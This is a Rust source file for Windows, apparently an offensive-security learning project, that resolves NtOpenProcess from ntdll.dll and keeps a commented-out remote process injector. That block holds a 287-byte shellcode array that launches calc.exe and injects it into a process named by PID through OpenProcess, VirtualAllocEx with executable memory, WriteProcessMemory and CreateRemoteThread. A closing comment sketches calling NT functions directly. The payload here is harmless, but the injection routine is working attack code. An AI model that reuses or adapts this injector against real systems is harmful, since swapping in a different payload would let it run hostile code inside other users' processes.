extern crate kernel32;
extern crate ntapi;
extern crate winapi;
extern crate ntstatus;

// use std::env;
// use std::ptr;

// use winapi::um::winnt::*;

use winapi::shared::minwindef::HINSTANCE__;
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
use std::ffi::CString;


//use ntstatus::ntstatus::NtStatus::*;

fn main() {
    unsafe{
        let NtOpenProcessAddr = get_ntfunction_address("NtOpenProcess");
    }

    /* 
    let calc_shellcode: [u8; 287] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x6d, 0x64,
        0x2e, 0x65, 0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78,
        0x65, 0x00,
    ];
    
    
    let args: Vec<String> = env::args().collect();
    let pid: u32 = args[1]
        .trim()
        .parse()
        .expect("Invalid string could not convert");

    unsafe {
        let hprocess = kernel32::OpenProcess(PROCESS_ALL_ACCESS, false as i32, pid);
        let buffer = kernel32::VirtualAllocEx(
            hprocess,
            ptr::null_mut(),
            calc_shellcode.len() as u64,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        
        let mut bytes = 0;

        kernel32::WriteProcessMemory(
            hprocess,
            buffer,
            calc_shellcode.as_ptr() as _, 
            calc_shellcode.len() as u64,
            &mut bytes,
        );

        kernel32::CreateRemoteThread(
            hprocess,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(buffer)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );
        kernel32::CloseHandle(hprocess);
    }
    */
}


unsafe fn get_ntfunction_address(func_name: &str) -> Option<*mut winapi::shared::minwindef::__some_function>{
    let lib_name = CString::new("ntdll.dll").unwrap();
    let h_module: *mut HINSTANCE__ = LoadLibraryA(lib_name.as_ptr());
    
    if h_module.is_null() {
        eprintln!("Failed to load library");
        return None;
    }

    let func_name = CString::new(func_name).unwrap();
	let func_addr: *mut winapi::shared::minwindef::__some_function  = GetProcAddress(h_module, func_name.as_ptr());

	if func_addr.is_null(){
		println!("[GetProcAddress] failed, error: 0x{}", kernel32::GetLastError());
        return None;
	}
    
    println!("[0x{:?}] -> {:?}!", func_addr, func_name);
	
    Some(func_addr)

}

/*
This is what I am going to do with each function that I need

[dependencies]
libloading = "0.7"

extern crate libloading;

use libloading::{Library, Symbol};

fn main() {
    // Load the ntdll.dll library
    let lib = Library::new("ntdll.dll").unwrap();

    // Define the function signature
    type NtQuerySystemInformation = unsafe extern "system" fn(
        SystemInformationClass: u32,
        SystemInformation: *mut u8,
        SystemInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> i32;

    // Get the function from the library
    let func: Symbol<NtQuerySystemInformation> = unsafe {
        lib.get(b"NtQuerySystemInformation").unwrap()
    };

    // Call the function (example parameters)
    let mut buffer: [u8; 1024] = [0; 1024];
    let mut return_length: u32 = 0;
    let status = unsafe {
        func(5, buffer.as_mut_ptr(), buffer.len() as u32, &mut return_length)
    };

    println!("Status: {}", status);
}

*/